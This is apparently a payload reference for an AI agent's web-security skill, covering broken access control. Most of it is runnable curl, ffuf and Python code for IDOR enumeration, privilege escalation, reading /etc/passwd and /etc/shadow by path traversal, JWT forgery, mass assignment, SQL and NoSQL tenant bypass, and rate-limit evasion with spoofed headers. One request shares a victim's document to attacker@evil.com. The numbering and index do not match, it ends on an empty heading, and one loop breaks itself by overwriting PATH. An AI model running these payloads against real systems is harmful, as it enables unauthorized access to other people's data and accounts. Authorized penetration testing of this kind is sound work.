# Broken Access Control Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for access control testing by attack type.
> Purpose: Quickly find request construction patterns for IDOR, privilege escalation, path traversal, forced browsing, and other attacks.
> All payloads are for authorized security testing only.

---

## Index

1. [IDOR (Insecure Direct Object Reference)](#1-idor-insecure-direct-object-reference)
2. [Privilege Escalation](#2-privilege-escalation)
3. [Path Traversal](#3-path-traversal)
4. [Forced Browsing](#4-forced-browsing)
5. [Parameter Tampering](#5-parameter-tampering)
6. [HTTP Method Tampering](#6-http-method-tampering)
7. [Header Spoofing Bypass](#7-header-spoofing-bypass)

---

## 1. IDOR (Insecure Direct Object Reference)

### Integer ID Replacement

```bash
# Access User_B's resource using User_A's credentials
curl -s -H "Cookie: session=USER_A_TOKEN" \
     http://target/api/v1/users/123/profile
curl -s -H "Cookie: session=USER_A_TOKEN" \
     http://target/api/v1/users/456/profile
# Both return 200 -> IDOR confirmed
```

### ffuf Batch IDOR

```bash
# Integer ID range
ffuf -u "http://target/api/v1/users/FUZZ/profile" \
     -w <(seq 1 1000) \
     -H "Cookie: session=USER_A_TOKEN" \
     -fc 403,404 -mc 200

# POST request IDOR
ffuf -u "http://target/api/v1/orders" \
     -X POST -H "Content-Type: application/json" \
     -H "Cookie: session=USER_A_TOKEN" \
     -d '{"user_id": FUZZ, "action": "view"}' \
     -w <(seq 1 500) -fc 403,404
```

### UUID-Based IDOR

```bash
# Collect UUIDs from API responses
curl -s -H "Cookie: session=TOKEN" \
     http://target/api/v1/users/me/posts | jq '.[].author_id'

# Batch test
for uuid in $(cat collected_uuids.txt); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
          -H "Cookie: session=OTHER_TOKEN" \
          "http://target/api/v1/documents/$uuid")
    [ "$code" = "200" ] && echo "[+] IDOR: $uuid"
done
```

### Multi-Level IDOR

```bash
# Organization -> Project -> Document three-level
curl -s -H "Cookie: session=TOKEN" \
     http://target/api/v1/orgs/1/projects/5/docs/42
# Replace IDs layer by layer, testing authorization checks at each level
```

---

## 2. Privilege Escalation

### Vertical Privilege Escalation -- Admin Endpoint Discovery

```bash
ADMIN_ENDPOINTS=("/admin" "/administrator" "/manage" "/console" "/dashboard"
  "/admin/users" "/admin/settings" "/admin/config" "/admin/logs"
  "/api/v1/admin/users" "/api/internal/debug")

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -H "Cookie: session=$USER_TOKEN" \
             "http://target$endpoint")
    if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ] && [ "$STATUS" != "404" ]; then
        echo "[+] $endpoint -> $STATUS (possible privilege escalation)"
    fi
done
```

### Role Parameter Tampering

```bash
# Inject role via JSON body
curl -s -H "Cookie: session=$USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin","user_id":123}' \
     "http://target/api/v1/users/update"

# Cookie/JWT claims tampering
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin
```

---

## 3. Path Traversal

### Basic Path Traversal

```bash
curl "http://target/file?name=../../../etc/passwd"
curl "http://target/file?name=../../etc/shadow"
curl "http://target/file?name=../../../proc/self/environ"
```

### URL Encoding Bypass

```bash
# Single encoding
curl "http://target/file?name=..%2f..%2f..%2fetc/passwd"

# Double encoding
curl "http://target/file?name=..%252f..%252f..%252fetc/passwd"
curl --path-as-is "http://target/..%252f..%252f..%252fetc/passwd"
```

### Unicode/Special Encoding Bypass

```bash
curl "http://target/file?name=..%c0%ae%c0%ae%c0%afetc/passwd"
curl "http://target/file?name=..\\..\\..\\windows\\win.ini"
curl "http://target/file?name=....//....//....//etc/passwd"
```

### ffuf Batch Path Traversal

```bash
ffuf -u "http://target/file?name=FUZZ" \
     -w path_traversal_payloads.txt \
     -fc 403,404 -mc 200 -fs 0
```

---

## 4. Forced Browsing

### Sensitive Directory Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://target/FUZZ -mc 200,401,403

# Backup/sensitive files
for file in backup.sql users.csv .env .git/HEAD config.yml dump.sql; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://target/$file")
    [ "$code" = "200" ] && echo "[+] Found: /$file"
done
```

### API Version Discovery

```bash
for ver in v1 v2 v3 api rest internal admin staging beta; do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
           -H "Cookie: session=$USER_TOKEN" \
           "http://target/$ver/admin/users")
    [ "$code" != "404" ] && echo "[+] /$ver/admin/users -> $code"
done
```

---

## 5. Parameter Tampering

### Case Obfuscation

```bash
curl "http://target/Admin/Dashboard"
curl "http://target/ADMIN/DELETE_USER"
curl "http://target/aDmIn/dElEtE"
```

### URL Encoding and Path Parameter Obfuscation

```bash
curl "http://target/%61dmin/%64elete"         # /admin/delete
curl "http://target/admin;/dashboard"
curl "http://target/admin/./dashboard"
curl --path-as-is "http://target/admin%00/dashboard"
curl "http://target/admin%0a/dashboard"
curl "http://target/admin%23/dashboard"
```

### JSON Parameter Injection

```bash
# Add extra parameters
curl -s -X PATCH http://target/api/v1/users/123 \
     -H "Cookie: session=$TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","role":"admin","is_admin":true}'
```

---

## 6. HTTP Method Tampering

```bash
TARGET_URL="http://target/admin/delete_user?id=1"
for method in GET POST PUT DELETE PATCH HEAD OPTIONS; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
             -X "$method" -H "Cookie: session=$USER_TOKEN" \
             "$TARGET_URL")
    echo "[$method] -> $STATUS"
done
# Common bypass: GET is blocked but PUT/DELETE are not
```

---

## 7. Header Spoofing Bypass

### X-Original-URL Bypass

```bash
# Some frameworks (e.g. Spring) support this header to override routing
curl -H "X-Original-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"

curl -H "X-Rewrite-URL: /admin/dashboard" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/"
```

### IP Spoofing to Bypass Internal Access Controls

```bash
curl -H "X-Custom-IP-Authorization: 127.0.0.1" \
     -H "Cookie: session=$USER_TOKEN" \
     "http://target/admin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Real-IP: localhost" \
     "http://target/admin"

curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Originating-IP: 127.0.0.1" \
     -H "X-Client-IP: 127.0.0.1" \
     "http://target/admin/debug"
```

---

## 8. JWT Token Manipulation

### None Algorithm Attack
```bash
# Decode JWT header, change alg to "none"
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
# Combine with payload (no signature)
# header.payload.
```

### Role Claim Tampering
```bash
# Decode payload
echo "$JWT_PAYLOAD" | base64 -d
# Change "role":"user" to "role":"admin"
# Re-encode and sign (if key is known/weak)
```

### Key Confusion (RS256 → HS256)
```python
import jwt
import requests

# Get public key
pub_key = requests.get("http://target/.well-known/jwks.json").json()

# Sign with public key using HS256
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    pub_key,
    algorithm="HS256"
)
```

## 9. Multi-Step Privilege Escalation

### Horizontal to Vertical
```bash
# Step 1: Access another user's profile (horizontal)
curl -H "Authorization: Bearer $TOKEN" "http://target/api/users/2/profile"

# Step 2: Find admin user ID from user listing
curl -H "Authorization: Bearer $TOKEN" "http://target/api/users?role=admin"

# Step 3: Access admin profile (vertical)
curl -H "Authorization: Bearer $TOKEN" "http://target/api/users/1/profile"

# Step 4: Modify admin settings
curl -X PUT -H "Authorization: Bearer $TOKEN" \
     -d '{"role":"admin"}' "http://target/api/users/$(whoami)/role"
```

### Race Condition Privilege Escalation
```python
import threading
import requests

def change_role():
    requests.put(
        "http://target/api/profile",
        json={"role": "admin"},
        headers={"Authorization": f"Bearer {token}"}
    )

# Send multiple concurrent requests
threads = [threading.Thread(target=change_role) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

## 10. API Endpoint Discovery

### Forced Browsing Wordlist
```bash
# Common admin endpoints
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 50

# API versioning bypass
curl http://target/api/v1/admin/users    # 403
curl http://target/api/v2/admin/users    # might be 200
curl http://target/api/internal/users    # undocumented

# GraphQL introspection
curl -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

### Swagger/OpenAPI Exposure
```bash
# Common documentation endpoints
for path in /swagger.json /openapi.json /api-docs /swagger-ui.html /docs; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://target$path")
  echo "$path: $status"
done
```

---

## 11. IDOR Exploitation (Advanced)

### Sequential ID Enumeration with Response Diffing

```bash
# Enumerate sequential IDs and compare response sizes to detect data leakage
BASE_URL="http://target/api/v1/invoices"
AUTH="Cookie: session=$USER_TOKEN"

for id in $(seq 1 500); do
  RESP=$(curl -s -w "\n%{http_code}|%{size_download}" \
    -H "$AUTH" "${BASE_URL}/${id}")
  CODE=$(echo "$RESP" | tail -1 | cut -d'|' -f1)
  SIZE=$(echo "$RESP" | tail -1 | cut -d'|' -f2)
  [ "$CODE" = "200" ] && [ "$SIZE" -gt 50 ] && \
    echo "[+] ID=$id CODE=$CODE SIZE=$SIZE bytes"
done | tee /tmp/idor-enum-results.txt
```

### UUID Prediction via Timestamp Analysis

```python
import uuid
import requests
from datetime import datetime, timedelta

def predict_uuids_v1(known_uuid, target_url, token):
    """Predict UUID v1 values based on timestamp and node components"""
    # UUID v1 contains timestamp and MAC address
    parsed = uuid.UUID(known_uuid)
    timestamp = parsed.time  # 100-nanosecond intervals since 1582-10-15
    node = parsed.node
    clock_seq = parsed.clock_seq

    # Generate UUIDs for nearby timestamps (within 1 hour)
    predicted = []
    for offset in range(-3600, 3600):
        # Each second = 10,000,000 100-ns intervals
        new_time = timestamp + (offset * 10_000_000)
        try:
            candidate = uuid.UUID(fields=(
                new_time & 0xFFFFFFFF,
                (new_time >> 32) & 0xFFFF,
                ((new_time >> 48) & 0x0FFF) | 0x1000,
                clock_seq >> 8,
                clock_seq & 0xFF,
                node
            ))
            predicted.append(str(candidate))
        except ValueError:
            continue

    # Test predicted UUIDs
    hits = []
    for candidate_uuid in predicted[:100]:
        resp = requests.get(
            f"{target_url}/{candidate_uuid}",
            headers={"Authorization": f"Bearer {token}"}
        )
        if resp.status_code == 200:
            hits.append({"uuid": candidate_uuid, "data": resp.json()})

    return hits
```

### Parameter Tampering with Nested Objects

```bash
# Test IDOR via nested JSON parameters
curl -s -X POST "http://target/api/v1/documents/share" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"document_id": "OTHER_USER_DOC_ID", "share_with": "attacker@evil.com"}'

# Array-based IDOR — access multiple resources in one request
curl -s -X POST "http://target/api/v1/bulk/download" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ids": [1, 2, 3, 100, 200, 500, 1000]}'

# GraphQL IDOR via node ID manipulation
curl -s -X POST "http://target/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ node(id: \"VXNlcjoxMDA=\") { ... on User { email, role, ssn } } }"}'

# Base64 decode: "User:100" -> try "User:1" (admin)
echo -n "User:1" | base64  # VXNlcjox
curl -s -X POST "http://target/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ node(id: \"VXNlcjox\") { ... on User { email, role } } }"}'
```

### IDOR via File Reference Manipulation

```bash
# Manipulate file download references
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/v1/files/download?ref=user_123_report.pdf"
# Change to another user's file
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/v1/files/download?ref=user_456_report.pdf"

# S3 pre-signed URL parameter tampering
# Original: /api/files?key=uploads/user123/private.pdf
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://target/api/files?key=uploads/user456/private.pdf"

# Hash-based reference brute force
for i in $(seq 1 100); do
  HASH=$(echo -n "document_${i}" | md5sum | cut -d' ' -f1)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "http://target/api/v1/docs/${HASH}")
  [ "$CODE" = "200" ] && echo "[+] Found: document_${i} -> ${HASH}"
done
```

### IDOR in WebSocket Messages

```python
import asyncio
import websockets
import json

async def test_websocket_idor(ws_url, token, target_ids):
    """Test IDOR vulnerabilities in WebSocket-based APIs"""
    async with websockets.connect(
        ws_url,
        extra_headers={"Authorization": f"Bearer {token}"}
    ) as ws:
        for target_id in target_ids:
            # Subscribe to another user's channel
            await ws.send(json.dumps({
                "action": "subscribe",
                "channel": f"user_{target_id}_notifications"
            }))
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(response)
            if data.get("status") != "forbidden":
                print(f"[+] IDOR: Subscribed to user {target_id} channel")
                print(f"    Data: {json.dumps(data)[:200]}")

            # Request another user's data via WebSocket
            await ws.send(json.dumps({
                "action": "get_profile",
                "user_id": target_id
            }))
            response = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(response)
            if "email" in str(data) or "phone" in str(data):
                print(f"[+] IDOR: Got PII for user {target_id}")

asyncio.run(test_websocket_idor("wss://target/ws", TOKEN, range(1, 50)))
```

---

## 12. Role-Based Access Bypass

### Privilege Escalation via Mass Assignment

```bash
# Register new user with injected admin role
curl -s -X POST "http://target/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","email":"a@b.com","role":"admin","is_staff":true,"is_superuser":true}'

# Update profile with hidden admin fields
curl -s -X PUT "http://target/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Normal User","role_id":1,"permissions":["admin:*"],"group":"administrators"}'

# Test various privilege field names
for field in role is_admin admin privilege level group_id permission_level access_level user_type account_type; do
  echo "[*] Testing field: $field"
  curl -s -X PATCH "http://target/api/v1/profile" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"$field\": \"admin\"}" | jq '.role // .is_admin // .privilege // empty'
done
```

### Admin Panel Access via Direct URL

```bash
# Comprehensive admin panel discovery
ADMIN_PATHS=(
  "/admin" "/admin/" "/administrator" "/manage" "/management"
  "/console" "/portal" "/cp" "/controlpanel" "/backend"
  "/admin/dashboard" "/admin/users" "/admin/settings"
  "/api/admin" "/api/v1/admin" "/api/internal"
  "/_admin" "/~admin" "/admin.php" "/wp-admin"
  "/admin/login" "/admin/index" "/panel"
  "/system" "/sys" "/internal" "/staff"
)

echo "[*] Testing $(echo ${#ADMIN_PATHS[@]}) admin paths with regular user token"
for path in "${ADMIN_PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $USER_TOKEN" \
    "http://target${path}")
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "301" ] || [ "$STATUS" = "302" ]; then
    echo "[+] ACCESSIBLE: ${path} -> ${STATUS}"
  fi
done
```

### Function-Level Authorization Bypass

```bash
# Test admin-only API functions with regular user credentials
ADMIN_FUNCTIONS=(
  "POST /api/v1/users/create"
  "DELETE /api/v1/users/123"
  "PUT /api/v1/settings/global"
  "POST /api/v1/roles/assign"
  "GET /api/v1/audit/logs"
  "POST /api/v1/backup/create"
  "DELETE /api/v1/cache/flush"
  "PUT /api/v1/config/update"
  "POST /api/v1/users/bulk-delete"
  "GET /api/v1/reports/financial"
)

for func in "${ADMIN_FUNCTIONS[@]}"; do
  METHOD=$(echo "$func" | cut -d' ' -f1)
  ENDPOINT=$(echo "$func" | cut -d' ' -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$METHOD" \
    -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
    -H "Content-Type: application/json" \
    "http://target${ENDPOINT}")
  if [ "$STATUS" != "403" ] && [ "$STATUS" != "401" ]; then
    echo "[+] BYPASS: $METHOD $ENDPOINT -> $STATUS"
  fi
done
```

### JWT Role Escalation Techniques

```python
import jwt
import base64
import json
import requests

def escalate_jwt_role(token, target_url):
    """Attempt multiple JWT manipulation techniques for role escalation"""
    results = []

    # Decode without verification
    parts = token.split(".")
    header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

    # Technique 1: alg=none
    header_none = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    payload["role"] = "admin"
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b"=").decode()
    none_token = f"{header_none}.{payload_b64}."

    resp = requests.get(target_url, headers={"Authorization": f"Bearer {none_token}"})
    results.append({"technique": "alg_none", "status": resp.status_code})

    # Technique 2: Weak secret brute force
    common_secrets = ["secret", "password", "123456", "key", "jwt_secret", "changeme"]
    for secret in common_secrets:
        try:
            forged = jwt.encode(payload, secret, algorithm="HS256")
            resp = requests.get(target_url, headers={"Authorization": f"Bearer {forged}"})
            if resp.status_code == 200:
                results.append({"technique": f"weak_secret:{secret}", "status": 200})
                break
        except Exception:
            continue

    return results
```

### Permission Boundary Testing

```bash
# Test cross-role actions (user A performing user B's role-specific actions)
# Scenario: Regular user trying manager-only operations

# Approve leave request (manager only)
curl -s -X POST "http://target/api/v1/leave/approve" \
  -H "Authorization: Bearer $REGULAR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"request_id": 42, "approved": true}'

# Access salary information (HR only)
curl -s "http://target/api/v1/employees/salary?department=engineering" \
  -H "Authorization: Bearer $REGULAR_TOKEN"

# Modify another team's project (cross-team boundary)
curl -s -X PUT "http://target/api/v1/projects/other-team-project/settings" \
  -H "Authorization: Bearer $REGULAR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"visibility": "public", "allow_external": true}'
```

---

## 13. Multi-Tenancy Attacks

### Tenant Isolation Bypass

```bash
# Manipulate tenant identifier in headers
curl -s "http://target/api/v1/users" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -H "X-Tenant-ID: tenant-b-id"

# Tenant ID in subdomain vs header mismatch
curl -s "https://tenant-a.target.com/api/v1/data" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -H "X-Tenant-ID: tenant-b-id"

# Tenant ID in path parameter
curl -s "http://target/api/v1/tenants/TENANT_B_ID/users" \
  -H "Authorization: Bearer $TENANT_A_TOKEN"

# Tenant ID in query parameter
curl -s "http://target/api/v1/reports?tenant_id=TENANT_B_ID" \
  -H "Authorization: Bearer $TENANT_A_TOKEN"
```

### Cross-Tenant Data Access

```python
import requests

def test_cross_tenant_access(base_url, tenant_a_token, tenant_b_id):
    """Systematically test cross-tenant data access vectors"""
    vectors = [
        # Header manipulation
        {"method": "GET", "path": "/api/v1/users",
         "headers": {"X-Tenant-ID": tenant_b_id}},
        # Path parameter
        {"method": "GET", "path": f"/api/v1/tenants/{tenant_b_id}/documents"},
        # Query parameter
        {"method": "GET", "path": "/api/v1/search",
         "params": {"tenant": tenant_b_id, "q": "*"}},
        # Body parameter
        {"method": "POST", "path": "/api/v1/reports/generate",
         "json": {"tenant_id": tenant_b_id, "type": "full"}},
        # Shared resource access
        {"method": "GET", "path": f"/api/v1/shared/files?owner_tenant={tenant_b_id}"},
        # Webhook/integration endpoints
        {"method": "POST", "path": "/api/v1/integrations/webhook",
         "json": {"target_tenant": tenant_b_id, "event": "data_export"}},
    ]

    findings = []
    for vector in vectors:
        headers = {"Authorization": f"Bearer {tenant_a_token}"}
        headers.update(vector.get("headers", {}))
        resp = requests.request(
            vector["method"], f"{base_url}{vector['path']}",
            headers=headers,
            params=vector.get("params"),
            json=vector.get("json")
        )
        if resp.status_code == 200:
            findings.append({
                "vector": vector["path"],
                "method": vector["method"],
                "response_size": len(resp.content),
                "contains_data": len(resp.json()) > 0 if resp.headers.get("content-type", "").startswith("application/json") else False
            })

    return findings
```

### Shared Resource Exploitation

```bash
# Test shared storage/CDN for tenant isolation
# Upload file as tenant A, access as tenant B
UPLOAD_RESP=$(curl -s -X POST "http://target/api/v1/files/upload" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -F "file=@test.txt")
FILE_URL=$(echo "$UPLOAD_RESP" | jq -r '.url')

# Try accessing with tenant B credentials
curl -s -H "Authorization: Bearer $TENANT_B_TOKEN" "$FILE_URL"

# Try accessing without any credentials (public CDN leak)
curl -s "$FILE_URL"

# Enumerate other tenants' files via predictable paths
for tenant in tenant-a tenant-b tenant-c demo staging; do
  URL="https://cdn.target.com/${tenant}/exports/users.csv"
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
  [ "$CODE" = "200" ] && echo "[+] Accessible: $URL"
done
```

### Database-Level Tenant Leakage

```bash
# SQL injection to bypass tenant filter
# If app adds WHERE tenant_id = X, try to break out
curl -s "http://target/api/v1/products?category=electronics' OR tenant_id != '$CURRENT_TENANT'--" \
  -H "Authorization: Bearer $TOKEN"

# NoSQL injection for tenant bypass (MongoDB)
curl -s "http://target/api/v1/users?tenant_id[$ne]=current_tenant" \
  -H "Authorization: Bearer $TOKEN"

# GraphQL tenant boundary testing
curl -s -X POST "http://target/graphql" \
  -H "Authorization: Bearer $TENANT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ allUsers(filter: {tenantId: {ne: \"tenant-a\"}}) { id email tenant { name } } }"}'
```

---

## 14. API Authorization Flaws

### Missing Authentication Checks

```bash
# Test endpoints without any authentication
API_ENDPOINTS=(
  "GET /api/v1/users"
  "GET /api/v1/config"
  "GET /api/v1/health"
  "GET /api/v1/metrics"
  "GET /api/v1/debug"
  "POST /api/v1/password-reset"
  "GET /api/v1/exports/users.csv"
  "GET /api/internal/status"
  "GET /api/v1/webhooks"
  "GET /actuator/env"
)

echo "[*] Testing endpoints without authentication"
for entry in "${API_ENDPOINTS[@]}"; do
  METHOD=$(echo "$entry" | cut -d' ' -f1)
  PATH=$(echo "$entry" | cut -d' ' -f2)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X "$METHOD" "http://target${PATH}")
  if [ "$STATUS" = "200" ]; then
    echo "[+] NO AUTH REQUIRED: $METHOD $PATH -> $STATUS"
  fi
done
```

### Broken Object-Level Authorization (BOLA)

```python
import requests
import itertools

def test_bola(base_url, tokens, resource_paths):
    """Test Broken Object-Level Authorization across multiple users"""
    findings = []

    for token_owner, token in tokens.items():
        for resource_owner, paths in resource_paths.items():
            if token_owner == resource_owner:
                continue  # Skip own resources

            for path in paths:
                resp = requests.get(
                    f"{base_url}{path}",
                    headers={"Authorization": f"Bearer {token}"}
                )
                if resp.status_code == 200:
                    findings.append({
                        "attacker": token_owner,
                        "victim": resource_owner,
                        "path": path,
                        "status": resp.status_code,
                        "data_leaked": len(resp.content) > 100
                    })

    return findings

# Example usage
tokens = {"user_a": "token_a", "user_b": "token_b", "user_c": "token_c"}
resources = {
    "user_a": ["/api/v1/users/1/profile", "/api/v1/users/1/orders"],
    "user_b": ["/api/v1/users/2/profile", "/api/v1/users/2/orders"],
    "user_c": ["/api/v1/users/3/profile", "/api/v1/users/3/orders"],
}
```

### Broken Function-Level Authorization (BFLA)

```bash
# Test write operations that should require elevated privileges
echo "[*] Testing BFLA - write operations with read-only token"

# Create resource (should require write permission)
curl -s -X POST "http://target/api/v1/products" \
  -H "Authorization: Bearer $READONLY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","price":0}' -w "\nStatus: %{http_code}\n"

# Delete resource (should require admin)
curl -s -X DELETE "http://target/api/v1/products/1" \
  -H "Authorization: Bearer $READONLY_TOKEN" -w "\nStatus: %{http_code}\n"

# Modify permissions (should require owner/admin)
curl -s -X PUT "http://target/api/v1/products/1/permissions" \
  -H "Authorization: Bearer $READONLY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"public": true}' -w "\nStatus: %{http_code}\n"

# Execute admin actions with user token
curl -s -X POST "http://target/api/v1/admin/impersonate" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"target_user_id": 1}' -w "\nStatus: %{http_code}\n"
```

### Rate Limit Bypass for Authorization Testing

```bash
# Bypass rate limiting to test authorization at scale
# Rotate headers to avoid per-IP rate limits
HEADERS=(
  "X-Forwarded-For: 10.0.0.$(shuf -i 1-254 -n 1)"
  "X-Real-IP: 172.16.$(shuf -i 0-255 -n 1).$(shuf -i 1-254 -n 1)"
  "X-Originating-IP: 192.168.$(shuf -i 0-255 -n 1).$(shuf -i 1-254 -n 1)"
)

for id in $(seq 1 1000); do
  HEADER=${HEADERS[$((RANDOM % ${#HEADERS[@]}))]}
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    -H "$HEADER" \
    "http://target/api/v1/users/${id}/profile")
  [ "$CODE" = "200" ] && echo "[+] Accessible: user $id"
  [ "$CODE" = "429" ] && echo "[!] Rate limited at id=$id" && sleep 2
done
```

### OAuth Scope Bypass

```bash
# Test accessing resources beyond granted OAuth scope
# Token has scope: read:profile
# Try accessing resources requiring write:profile or admin scope

curl -s "http://target/api/v1/admin/users" \
  -H "Authorization: Bearer $LIMITED_SCOPE_TOKEN" -w "\n%{http_code}"

curl -s -X PUT "http://target/api/v1/users/me/role" \
  -H "Authorization: Bearer $LIMITED_SCOPE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}' -w "\n%{http_code}"

# Token exchange/refresh with elevated scope
curl -s -X POST "http://target/oauth/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=refresh_token&refresh_token=$REFRESH_TOKEN&scope=admin:*"
```

---

## 15. Path Traversal for Access Control

### Directory Traversal to Bypass Route-Level ACL

```bash
# Bypass path-based access control using traversal sequences
# If /admin/* requires admin role, try:
curl -s "http://target/public/../admin/dashboard" \
  -H "Authorization: Bearer $USER_TOKEN"

curl --path-as-is "http://target/api/v1/../../admin/users" \
  -H "Authorization: Bearer $USER_TOKEN"

# URL-encoded traversal
curl -s "http://target/public/..%2fadmin%2fdashboard" \
  -H "Authorization: Bearer $USER_TOKEN"

# Double-encoded
curl -s "http://target/public/..%252fadmin%252fdashboard" \
  -H "Authorization: Bearer $USER_TOKEN"

# Backslash variant (Windows/IIS)
curl -s "http://target/public/..\\admin\\dashboard" \
  -H "Authorization: Bearer $USER_TOKEN"
```

### URL Normalization Bypass

```bash
# Exploit differences between proxy/WAF and application URL parsing
# Semicolon path parameter (Tomcat/Spring)
curl -s "http://target/admin;/dashboard" -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/admin;foo=bar/users" -H "Authorization: Bearer $USER_TOKEN"

# Fragment and null byte
curl -s "http://target/admin%00.html" -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/admin%23/dashboard" -H "Authorization: Bearer $USER_TOKEN"

# Case manipulation (IIS)
curl -s "http://target/Admin/Dashboard" -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/ADMIN/USERS" -H "Authorization: Bearer $USER_TOKEN"

# Trailing characters
curl -s "http://target/admin/" -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/admin/." -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/admin..;/" -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/admin%20" -H "Authorization: Bearer $USER_TOKEN"
curl -s "http://target/admin%09" -H "Authorization: Bearer $USER_TOKEN"
```

### Reverse Proxy Path Confusion

```bash
# Exploit path interpretation differences between reverse proxy and backend
# Nginx + Gunicorn path confusion
curl -s "http://target/static/../api/admin/users" \
  -H "Authorization: Bearer $USER_TOKEN"

# Apache mod_proxy path normalization bypass
curl -s "http://target/public/%2e%2e/admin/config" \
  -H "Authorization: Bearer $USER_TOKEN"

# Caddy/Traefik path stripping bypass
curl -s "http://target/api/v1/..;/internal/debug" \
  -H "Authorization: Bearer $USER_TOKEN"

# HAProxy ACL bypass via HTTP request smuggling-style paths
curl -s "http://target/allowed-path/../restricted-path" \
  -H "Authorization: Bearer $USER_TOKEN" \
  --path-as-is
```

### Verb Tunneling with Path Traversal

```bash
# Combine HTTP method override with path traversal
curl -s -X POST "http://target/api/v1/public/action" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "X-Original-URL: /api/v1/admin/users/1"

# Method override via query parameter
curl -s "http://target/api/v1/users?_method=DELETE&id=1" \
  -H "Authorization: Bearer $USER_TOKEN"

# Override via Content-Type manipulation
curl -s -X POST "http://target/api/v1/data" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "_method=PUT&role=admin&user_id=attacker"
```

### Wildcard and Regex Route Bypass

```bash
# Exploit overly permissive route patterns
# If route is /api/v1/users/:id — test with special values
curl -s "http://target/api/v1/users/*" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/." -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/0" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/-1" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/undefined" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/null" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/__proto__" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v1/users/constructor" -H "Authorization: Bearer $TOKEN"

# Version prefix bypass
curl -s "http://target/api/v99/admin/users" -H "Authorization: Bearer $TOKEN"
curl -s "http://target/api/v0/admin/users" -H "Authorization: Bearer $TOKEN"
```

---

## 8. Access Control Bypass via HTTP Request Smuggling
